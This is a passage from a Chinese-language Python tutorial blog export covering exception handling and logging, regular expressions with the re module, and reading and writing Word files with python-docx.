<h4 id="try-except-else"><a href="#try-except-else" class="headerlink" title="try-except-else"></a>try-except-else</h4><p>Python在try - except中又增加了else指令，这个指令存放的主要目的是try内的指令正确时，可以执行else内的指令区块，我们可以将这部分指令区块称正确处理程序，这样可以增加程序的可读性。此时语法格式如下：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006164238383.png" alt="image-20201006164238383"></p>
<h4 id="FileNotFoundError"><a href="#FileNotFoundError" class="headerlink" title="FileNotFoundError"></a>FileNotFoundError</h4><p>一个常常发生的异常是打开文件时找不到文件，这时会产生FileNotFoundError异常。</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006164341891.png" alt="image-20201006164341891"></p>
<h4 id="分析单一文件的字数"><a href="#分析单一文件的字数" class="headerlink" title="分析单一文件的字数"></a>分析单一文件的字数</h4><p>如设计一个计算文章字数的函数wordsNum，只要传递文章文件名，就可以获得此篇文章的字数。</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006164602832.png" alt="image-20201006164602832"></p>
<h2 id="多组异常处理程序"><a href="#多组异常处理程序" class="headerlink" title="多组异常处理程序"></a>多组异常处理程序</h2><h4 id="常见的异常对象"><a href="#常见的异常对象" class="headerlink" title="常见的异常对象"></a>常见的异常对象</h4><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006164750005.png" alt="image-20201006164750005"></p>
<p>Python提供了一个通用型的异常对象Exception，它可以捕捉各式的基础异常。</p>
<p>如程序的异常对象设为Exception：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006164906040.png" alt="image-20201006164906040"></p>
<h4 id="捕捉多个异常"><a href="#捕捉多个异常" class="headerlink" title="捕捉多个异常"></a>捕捉多个异常</h4><p>在try: - except的使用中，可以设计多个except捕捉多种异常，此时语法如下：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165007916.png" alt="image-20201006165007916"></p>
<h4 id="使用一个except捕捉多个异常"><a href="#使用一个except捕捉多个异常" class="headerlink" title="使用一个except捕捉多个异常"></a>使用一个except捕捉多个异常</h4><p>Python也允许设计一个except，捕捉多个异常，此时语法如下：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165101291.png" alt="image-20201006165101291"></p>
<h4 id="使用Python内置的错误信息"><a href="#使用Python内置的错误信息" class="headerlink" title="使用Python内置的错误信息"></a>使用Python内置的错误信息</h4><p>Python支持发生异常时使用系统内置的异常处理信息。此时语法格式如下：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165216377.png" alt="image-20201006165216377"></p>
<p>e是系统内置的异常处理信息，e可以是任意字符。</p>
<h4 id="捕捉所有异常"><a href="#捕捉所有异常" class="headerlink" title="捕捉所有异常"></a>捕捉所有异常</h4><p>Python提供语法让我们可以一次捕捉所有异常，此时try - except语法如下：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165325759.png" alt="image-20201006165325759"></p>
<h2 id="丢出异常"><a href="#丢出异常" class="headerlink" title="丢出异常"></a>丢出异常</h2><p>Python直译器发现异常时，自行丢出异常对象，如果我们不处理程序就终止执行，如果我们使用try - except处理程序可以在异常中继续执行。</p>
<p>那么程序如果发生某些状况，我们自己将它定义为异常然后丢出异常信息，程序停止正常往下执行，同时让程序跳到自己设计的except去执行。它的语法如下：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165525546.png" alt="image-20201006165525546"></p>
<p>如目前有些金融机构在客户建立网络账号时，会要求密码长度必须在5到8个字符间，设计一个程序，这个程序内有passWord( )函数，这个函数会检查密码长度，如果长度小于5或是长度大于8皆抛出异常。</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165626571.png" alt="image-20201006165626571"></p>
<p>执行结果：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165649633.png" alt="image-20201006165649633"></p>
<h2 id="记录Traceback字符串"><a href="#记录Traceback字符串" class="headerlink" title="记录Traceback字符串"></a>记录Traceback字符串</h2><p>每次错误屏幕皆出现Traceback字符串，在这个字符串中指出程序错误的原因。导入traceback模块，就可以使用traceback.format_exc( )记录这个Traceback字符串。</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006165921029.png" alt="image-20201006165921029"></p>
<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>Python的关键词finally功能是和try配合使用，在try之后可以有except或else，这个finally关键词必须放在except和else之后，同时不论是否有异常发生一定会执行这个finally内的程序代码。这个功能主要是用在Python程序与数据库连接时，输出连接相关信息。</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006170032835.png" alt="image-20201006170032835"></p>
<h2 id="程序断言assert"><a href="#程序断言assert" class="headerlink" title="程序断言assert"></a>程序断言assert</h2><p>Python的assert关键词主要功能是协助在程序设计阶段，对整个程序的执行状态做一个全面性的安全检查，以确保程序不会发生语意上的错误。</p>
<p>断言(assert)主要功能是确保程序执行的某个阶段，必须符合一定的条件，如果不符合这个条件时程序主动抛出异常，让程序终止同时主动打印出异常原因，方便程序设计师侦错。它的语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert 条件，&#39;字符串&#39;</span><br></pre></td></tr></table></figure>
<p>程序执行至此阶段时测试条件，如果条件响应是True，程序不理会逗号“,”右边的字符串正常往下执行。如果条件响应是False，程序终止同时将逗号“,”右边的字符串输出到Traceback的字符串内。</p>
<p>停用断言assert，可以在Windows的命令提示环境，执行程序时使用“-O”选项停用断言。</p>
<h2 id="程序日志模块logging"><a href="#程序日志模块logging" class="headerlink" title="程序日志模块logging"></a>程序日志模块logging</h2><p>Python有程序日志logging功能，这个功能可以协助我们执行程序的除错，有了这个功能我们可以自行设定关键变量在每一个程序阶段的变化，由这个关键变量的变化可方便我们执行程序的除错。</p>
<h4 id="logging模块"><a href="#logging模块" class="headerlink" title="logging模块"></a>logging模块</h4><p>Python内有提供logging模块，这个模块有提供方法可以让我们使用程序日志logging功能，在使用前须先使用import导入此模块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import logging</span><br></pre></td></tr></table></figure>
<h4 id="logging的等级"><a href="#logging的等级" class="headerlink" title="logging的等级"></a>logging的等级</h4><p>logging模块共分5个等级，从最低到最高等级顺序如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DEBUG等级使用logging.debug( )显示程序日志内容，所显示的内容是程序的小细节，最低层级的内容，感觉程序有问题时可使用它追踪关键变量的变化过程。</span><br><span class="line"></span><br><span class="line">INFO等级使用logging.info( )显示程序日志内容，所显示的内容是记录程序一般发生的事件。</span><br><span class="line"></span><br><span class="line">WARNING等级使用logging.warning( )显示程序日志内容，所显示的内容虽然不会影响程序的执行，但是未来可能导致问题的发生。</span><br><span class="line"></span><br><span class="line">ERROR等级使用logging.error( )显示程序日志内容，通常显示程序在某些状态将引发错误的缘由。</span><br><span class="line"></span><br><span class="line">CRITICAL等级使用logging.critical( )显示程序日志内容，这是最重要的等级，通常是显示将让整个系统当掉或中断的错误。</span><br></pre></td></tr></table></figure>
<p>程序设计时，可以使用下列函数设定显示信息的等级：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">logging.basicConfig(level&#x3D;logging.DEBUG)  #设定DEBUG等级</span><br></pre></td></tr></table></figure>
<p>当设定logging为某一等级时，未来只有此等级或更高等级的logging会被显示。</p>
<p>如显示所有等级的logging信息：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006170937172.png" alt="image-20201006170937172"></p>
<p>执行结果：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006171000146.png" alt="image-20201006171000146"></p>
<h4 id="格式化logging信息输出format"><a href="#格式化logging信息输出format" class="headerlink" title="格式化logging信息输出format"></a>格式化logging信息输出format</h4><p>可以使用在logging.basicConfig( )方法内增加format格式化输出信息为空字符串‘’的方式，取消显示前导输出信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">logging.basicConfig(level&#x3D;logging.DEBUG,format&#x3D;&#39;&#39;)</span><br></pre></td></tr></table></figure>
<h4 id="时间信息asctime"><a href="#时间信息asctime" class="headerlink" title="时间信息asctime"></a>时间信息asctime</h4><p>可以在format内配合asctime列出系统时间，这样可以列出每一重要阶段关键变量发生的时间。</p>
<p>如列出每一个logging输出时的时间</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006181140290.png" alt="image-20201006181140290"></p>
<p>执行结果：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006181205827.png" alt="image-20201006181205827"></p>
<p>要输出原先logging.xxx( )的输出信息，必须在format内增加message格式。</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006181302448.png" alt="image-20201006181302448"></p>
<p>执行结果：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006181323359.png" alt="image-20201006181323359"></p>
<h4 id="将程序日志logging输出到文件"><a href="#将程序日志logging输出到文件" class="headerlink" title="将程序日志logging输出到文件"></a>将程序日志logging输出到文件</h4><p>将logging输出在屏幕，其实不太方便逐一核对关键变量值的变化，此时可以考虑将logging输出到文件，方法是在logging.basicConfig( )增加filename=“文件名”，这样就可以将logging输出到指定的文件内。</p>
<p>如将程序日志输出到txt里：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006181530241.png" alt="image-20201006181530241"></p>
<h4 id="停用程序日志logging"><a href="#停用程序日志logging" class="headerlink" title="停用程序日志logging"></a>停用程序日志logging</h4><p>可以使用下列方法停用日志logging：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">logging.disable(level)  #level是停用logging的等级</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-正则表达式</title>
    <url>/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>Python有关正则表达式的方法是在re模块内，使用正则表达式需要导入re模块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br></pre></td></tr></table></figure>
<h4 id="搜寻字符串模式"><a href="#搜寻字符串模式" class="headerlink" title="搜寻字符串模式"></a>搜寻字符串模式</h4><p>正则表达式是一种文本模式的表达方法，在这个方法中使用\d表示0—9的数字字符。由逸出字符的观念可知，当字符串放入函数内需增加‘\’，所以整个正则表达式的使用方式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;\\d\\dd\\d\\d\\d-\\d\\d\\d\\d&#39;</span><br><span class="line">或r&#39;\d\dd\d\d\d-\d\d\d\d&#39;</span><br></pre></td></tr></table></figure>
<h4 id="使用re-compile-建立Regex对象"><a href="#使用re-compile-建立Regex对象" class="headerlink" title="使用re.compile( )建立Regex对象"></a>使用re.compile( )建立Regex对象</h4><p>Regex是Regular expression的简称，在re模块内有compile( )方法，可以将欲搜寻字符串的正则表达式当作字符串参数放在此方法内，然后会传回一个Regex对象。</p>
<p>如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rule &#x3D; re.compile(r&#39;\d\dd\d\d\d-\d\d\d\d&#39;)</span><br><span class="line"></span><br><span class="line">对于重复出现的字符串可以用大括号内部加上重复次数方式表达：</span><br><span class="line">rule &#x3D; re.compile(r&#39;\d&#123;4&#125;-\d&#123;3&#125;&#39;)</span><br></pre></td></tr></table></figure>
<h4 id="搜寻对象"><a href="#搜寻对象" class="headerlink" title="搜寻对象"></a>搜寻对象</h4><p>在Regex对象内有search( )方法，可以由Regex对象启用，然后将欲搜寻的字符串放在这个方法内，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mb &#x3D; rule.search(msg)</span><br></pre></td></tr></table></figure>
<p>如果找不到比对相符的字符串会传回None，如果找到比对相符的字符串会将结果传回所设定的变量对象。</p>
<h4 id="findall"><a href="#findall" class="headerlink" title="findall()"></a>findall()</h4><p>这个方法会将搜寻到的目标用列表方式传回。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rule &#x3D; re.compile(r&#39;\d\dd\d\d\d-\d\d\d\d&#39;) #建立rule对象</span><br><span class="line">mb &#x3D; rule.findall(string)  #string是欲搜寻的字符串</span><br></pre></td></tr></table></figure>
<p>findall( )函数由rule对象启用，最后会将搜寻结果的列表传给mb，只要打印mb就可以得到执行结果。</p>
<h4 id="使用小括号分组"><a href="#使用小括号分组" class="headerlink" title="使用小括号分组"></a>使用小括号分组</h4><p>括号分组是以连字符“-”区别，然后用小括号隔开群组。如下面两个分组：</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201007093232469.png" alt="image-20201007093232469"></p>
<h4 id="使用管道"><a href="#使用管道" class="headerlink" title="使用管道"></a>使用管道</h4><p>|(pipe)在正规表示法称管道，使用管道我们可以同时搜寻比对多个字符串，例如，想要搜寻Mary和Tom字符串，可以使用下列表示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">patter &#x3D; &#39;mary|tom&#39;  #注意单引号&#39;和|旁不留空白</span><br></pre></td></tr></table></figure>
<h4 id="使用？做搜寻"><a href="#使用？做搜寻" class="headerlink" title="使用？做搜寻"></a>使用？做搜寻</h4><p>在正则表达式中若某些括号内的字符串或正则表达式可有可无，执行搜寻时皆算成功，例如，na字符串可有可无，表达方式是(na)?。</p>
<h4 id="使用-做搜寻"><a href="#使用-做搜寻" class="headerlink" title="使用*做搜寻"></a>使用*做搜寻</h4><p>在正则表达式中若某些字符串或正则表达式可从0到多次，执行搜寻时皆算成功，例如，na字符串可从0到多次，表达方式是(na)*。</p>
<h4 id="使用-做搜寻-1"><a href="#使用-做搜寻-1" class="headerlink" title="使用+做搜寻"></a>使用+做搜寻</h4><p>在正则表达式中若是某些字符串或正则表达式可从1到多次，执行搜寻时皆算成功，例如，na字符串可从1到多次，表达方式是(na)+。</p>
<h4 id="搜寻时忽略大小写"><a href="#搜寻时忽略大小写" class="headerlink" title="搜寻时忽略大小写"></a>搜寻时忽略大小写</h4><p>搜寻时若是在search( )或findall( )内增加第三个参数re.I或re.IGNORECASE，搜寻时就会忽略大小写，至于打印输出时将以原字符串的格式显示。</p>
<p>如以忽略大小写方式执行找寻相符字符串：</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201007094336734.png" alt="image-20201007094336734"></p>
<p>执行结果：</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201007094405095.png" alt="image-20201007094405095"></p>
<h4 id="使用大括号设定比对次数"><a href="#使用大括号设定比对次数" class="headerlink" title="使用大括号设定比对次数"></a>使用大括号设定比对次数</h4><p>大括号除了可以设定重复次数，也可以设定指定范围，例如，(son){3,5}代表所搜寻的字符串如果是‘sonsonson’‘sonsonsonson’或‘sonsonsonsonson’皆算是相符合的字符串。</p>
<h4 id="贪婪与非贪婪模式"><a href="#贪婪与非贪婪模式" class="headerlink" title="贪婪与非贪婪模式"></a>贪婪与非贪婪模式</h4><p>如使用搜寻模式‘(son){3,5}’，搜寻字符串‘sonsonsonsonson’。</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201007095020973.png" alt="image-20201007095020973"></p>
<p>上述程序所设定的搜寻模式可知3、4或5个son重复就算找到了，可是Python执行结果是列出最多重复的字符串，5次重复，这是Python的默认模式，这种模式又称贪婪(greedy)模式。</p>
<p>另一种是列出最少重复的字符串，称非贪婪模式，方法是在正则表达式的搜寻模式右边增加？符号。</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201007095124395.png" alt="image-20201007095124395"></p>
<h2 id="正则表达式的特殊字符"><a href="#正则表达式的特殊字符" class="headerlink" title="正则表达式的特殊字符"></a>正则表达式的特殊字符</h2><h4 id="特殊字符表"><a href="#特殊字符表" class="headerlink" title="特殊字符表"></a>特殊字符表</h4><p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201007095540458.png" alt="image-20201007095540458"></p>
<h4 id="字符分类"><a href="#字符分类" class="headerlink" title="字符分类"></a>字符分类</h4><p>python中可以用中括号来设定字符。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[a-z]：代表a-z的小写字符</span><br><span class="line">[A-Z]：代表A-Z的大写字符</span><br><span class="line">[aeiouAEIOU]：代表英文发音的元音字符</span><br><span class="line">[2-5]：代表2-5的数字</span><br></pre></td></tr></table></figure>
<p>在字符分类中，中括号内可以不用放上正则表示法的反斜杠\执行.、?、*、(、)等字符的转译。</p>
<h4 id="字符分类的-字符"><a href="#字符分类的-字符" class="headerlink" title="字符分类的^字符"></a>字符分类的^字符</h4><p>中括号内的左方加上^字符，意义是搜寻不在这些字符内的所有字符。</p>
<p>在正规表示法中起始位置加上^字符，表示正则表示法的字符串必须出现在被搜寻字符串的起始位置，这样搜寻成功才算成功。</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009135707635.png" alt="image-20201009135707635"></p>
<p>执行结果：</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009135738751.png" alt="image-20201009135738751"></p>
<h4 id="正则表示法的-字符"><a href="#正则表示法的-字符" class="headerlink" title="正则表示法的$字符"></a>正则表示法的$字符</h4><p>正则表示法的末端放置$字符时，表示正则表示法的字符串必须出现在被搜寻字符串的最后位置，这样搜寻成功才算成功。</p>
<h4 id="单一字符使用通配符“-”"><a href="#单一字符使用通配符“-”" class="headerlink" title="单一字符使用通配符“.”"></a>单一字符使用通配符“.”</h4><p>通配符(wildcard)“.”表示可以搜寻除了换行字符以外的所有字符，但是只限定一个字符。</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009140029088.png" alt="image-20201009140029088"></p>
<p>执行结果：</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009140048223.png" alt="image-20201009140048223"></p>
<h4 id="所有字符使用通配符“-”"><a href="#所有字符使用通配符“-”" class="headerlink" title="所有字符使用通配符“.*”"></a>所有字符使用通配符“.*”</h4><p>“.”字符与“*”组合，可以搜寻所有字符，意义是搜寻0到多个通配符（换行字符除外）。</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009140223690.png" alt="image-20201009140223690"></p>
<h4 id="换行字符的处理"><a href="#换行字符的处理" class="headerlink" title="换行字符的处理"></a>换行字符的处理</h4><p>用“.*”搜寻时碰上换行字符，搜寻就停止。Python的re模块提供参数re.DOTALL，功能是包括搜寻换行字符，可以将此参数放在search( )、findall( )或compile( )。</p>
<h2 id="MatchObject对象"><a href="#MatchObject对象" class="headerlink" title="MatchObject对象"></a>MatchObject对象</h2><h4 id="re-match"><a href="#re-match" class="headerlink" title="re.match( )"></a>re.match( )</h4><p>re.search( )搜寻字符串，搜寻成功时可以产生MatchObject对象，re.match( )方法搜寻成功后也将产生MatchObject对象。</p>
<p>这个方法其实和re.search( )相同，差异是re.match()只搜寻比对字符串开始的字，如果失败就算失败。re.search( )则是搜寻整个字符串。至于re.match( )搜寻成功会传回MatchObject对象，若是搜寻失败会传回None，这部分与re.search( )相同。</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009141736734.png" alt="image-20201009141736734"></p>
<p>执行结果：</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009141801562.png" alt="image-20201009141801562"></p>
<h4 id="MatchObject几个重要的方法"><a href="#MatchObject几个重要的方法" class="headerlink" title="MatchObject几个重要的方法"></a>MatchObject几个重要的方法</h4><p>当使用re.search( )或re.match( )搜寻成功时，会产生MatchOjbect对象。</p>
<p>Python提供下列取得MatchObject对象内容的重要方法。</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009141921625.png" alt="image-20201009141921625"></p>
<p>如分别使用re.match( )和re.search( )搜寻字符串Joah，成功搜寻到字符串时，分别用start( )、end( )和span( )方法列出字符串出现的位置。</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009142021370.png" alt="image-20201009142021370"></p>
<p>执行结果：</p>
<p><img src="/2020/10/06/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20201009142054105.png" alt="image-20201009142054105"></p>
<h4 id="sub-方法"><a href="#sub-方法" class="headerlink" title="sub()方法"></a>sub()方法</h4><p>Python re模块内的sub( )方法可以用新的字符串取代原本字符串的内容。</p>
<p>sub( )方法的基本使用语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">result &#x3D; re.sub(pattern,newstr,msg)  # msg是整个要处理的字符串或句子</span><br></pre></td></tr></table></figure>
<p>pattern是欲搜寻的字符串，如果搜寻成功则用newstr取代，同时成功取代的结果回传给result变量，如果搜寻到多个相同字符串，这些字符串将全部被取代，需留意原先msg内容将不会改变。如果搜寻失败则将msg内容回传给result变量，当然msg内容也不会改变。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-处理word文件</title>
    <url>/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<p>Word是二进制(binary)文件，同时Word还有字体格式、色彩与版面配置等，所以它的处理方式比起文本文件(txt)要复杂。</p>
<p>需要使用外部模块python-docx。安装指令是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install python-docx</span><br></pre></td></tr></table></figure>
<p>导入模块指令为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import docx</span><br></pre></td></tr></table></figure>
<h2 id="python中的word文件结构"><a href="#python中的word文件结构" class="headerlink" title="python中的word文件结构"></a>python中的word文件结构</h2><p>在python-docx模块内，将Word文件结构分成3层：</p>
<p>1、Document：这是最高层代表整个Word文件。</p>
<p>2、Paragraph：一个Word文件是由许多的段落所组成，在Python中整份文件的定义是Document，这些段落的定义就是Paragraph对象。我们使用Word编辑文件时，如果单击一次Enter键，会产生一个新的段落。在Python中一个段落代表一个Paragraph对象，所有段落以Paragraph对象列表(list)方式存在。</p>
<p>3、Run：Word文件要考虑的有字号、字体样式、色彩等，我们将这些称作样式。一个Run对象所指的是Paragraph对象中相同样式的连续文字，如果文字发生样式变化，Python将以新的Run对象代表。</p>
<h2 id="读取word文件内容"><a href="#读取word文件内容" class="headerlink" title="读取word文件内容"></a>读取word文件内容</h2><h4 id="建立docx对象"><a href="#建立docx对象" class="headerlink" title="建立docx对象"></a>建立docx对象</h4><p>首先需建立Word文件(Document)的对象docx对象，可用Document( )方法建立。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mydoc &#x3D; docx.Document(&#39;文件名&#39;)  #建立docx对象mydoc</span><br></pre></td></tr></table></figure>
<h4 id="获得paragraph和Run数量"><a href="#获得paragraph和Run数量" class="headerlink" title="获得paragraph和Run数量"></a>获得paragraph和Run数量</h4><p>使用len()方法获得paragraph数量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len(mydoc.paragraphs)</span><br></pre></td></tr></table></figure>
<p>下列语法可以获得第n段paragraph的Run数量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len(mydoc.paragraphs[n].runs)  #n是第几段或者paragraph编号</span><br></pre></td></tr></table></figure>
<h4 id="列出paragraph的内容"><a href="#列出paragraph的内容" class="headerlink" title="列出paragraph的内容"></a>列出paragraph的内容</h4><p>打印第n段Paragraph内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(mydoc.paragraphs[n].text)</span><br></pre></td></tr></table></figure>
<h4 id="列出paragraph内run的内容"><a href="#列出paragraph内run的内容" class="headerlink" title="列出paragraph内run的内容"></a>列出paragraph内run的内容</h4><p>打印第n段Paragraph第m个Run内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(mydoc.paragraphs[n].runs[m].text)</span><br></pre></td></tr></table></figure>
<h4 id="读取文件与适度编排输出"><a href="#读取文件与适度编排输出" class="headerlink" title="读取文件与适度编排输出"></a>读取文件与适度编排输出</h4><p>word内容为：</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009145349672.png" alt="image-20201009145349672"></p>
<p>程序内容为：</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009145501800.png" alt="image-20201009145501800"></p>
<h2 id="存储文件"><a href="#存储文件" class="headerlink" title="存储文件"></a>存储文件</h2><p>save( )方法可以存储Document对象的文件，如果将建立Word文件与存储Word文件整个语法串连，整个语法如下：</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009150028841.png" alt="image-20201009150028841"></p>
<h2 id="建立文件内容"><a href="#建立文件内容" class="headerlink" title="建立文件内容"></a>建立文件内容</h2><h4 id="建立标题"><a href="#建立标题" class="headerlink" title="建立标题"></a>建立标题</h4><p>使用add_heading( )方法建立文件标题内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mydoc.add_heading(&#39;content of head&#39;)  #mydoc为自建的文件对象</span><br></pre></td></tr></table></figure>
<p>Word的标题有1-9，如果想建立不同的标题可以使用第2个参数‘level=n’。</p>
<p>使用下列语法在建立文件标题内容同时设定标题格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mydoc.add_heading(&#39;content of head&#39;,level&#x3D;n)</span><br></pre></td></tr></table></figure>
<h4 id="建立段落paragraph内容"><a href="#建立段落paragraph内容" class="headerlink" title="建立段落paragraph内容"></a>建立段落paragraph内容</h4><p>可以使用add_paragraph( )方法建立文件的段落（也可称Paragraph）内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ptr &#x3D; mydoc.add_paragraph(&#39;content of paragraph&#39;)</span><br></pre></td></tr></table></figure>
<p>未来插入段落时可以将新段落插入此段落的前面，或是将Run内容插入此段落内。可以使用insert_paragraph_before( )方法，将段落插在上述ptr段落对象的前方。</p>
<p>如先插入2个段落，然后将新段落插在第一个段落的前面：</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009150606065.png" alt="image-20201009150606065"></p>
<h4 id="建立run内容"><a href="#建立run内容" class="headerlink" title="建立run内容"></a>建立run内容</h4><p>Paragraph是由Run组成，当我们建立Paragraph成功后，未来若是想要在Paragraph内插入内容，可以使用add_run( )方法，此方法的语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ptr.add_run(&#39;content of run&#39;)  #ptr是段落对象</span><br></pre></td></tr></table></figure>
<h4 id="强制换页输出"><a href="#强制换页输出" class="headerlink" title="强制换页输出"></a>强制换页输出</h4><p>add_page_break( )方法可以强制Word换页。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mydoc.add_page_break( )</span><br></pre></td></tr></table></figure>
<p>如果有插入段落时，会在新一页出现。</p>
<h4 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h4><p>使用add_picture( )方法插入图片到Word文件内，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mydoc.add_picture(&#39;image_file&#39;)</span><br></pre></td></tr></table></figure>
<p>如果插入图片时想要设定图片的宽度或高度，需导入docx.shared模块，然后就可以在add_picture( )方法内增加使用第2个参数width(宽度)或height(高度)，然后用Inches( )英寸函数或Cm( )公分函数设定图片宽度。</p>
